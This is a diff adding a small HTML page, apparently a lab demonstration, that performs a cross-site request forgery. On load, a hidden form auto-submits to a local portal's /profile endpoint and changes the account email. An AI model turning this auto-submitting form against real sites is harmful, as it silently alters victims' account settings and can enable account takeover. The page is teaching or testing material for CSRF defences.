@@ -1,0 +1,28 @@
+<!doctype html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <title>Local CSRF Demonstration</title>
+</head>
+<body>
+    <h1>Local CSRF demonstration</h1>
+    <p>This page automatically submits a request to the local portal.</p>
+
+    <form
+        id="csrf_form"
+        action="http://127.0.0.1:5000/profile"
+        method="post"
+    >
+        <input
+            type="hidden"
+            name="email"
+            value="csrf_changed@example.test"
+        >
+    </form>
+
+    <script>
+        const csrf_form = document.getElementById("csrf_form");
+        csrf_form.submit();
+    </script>
+</body>
+</html>
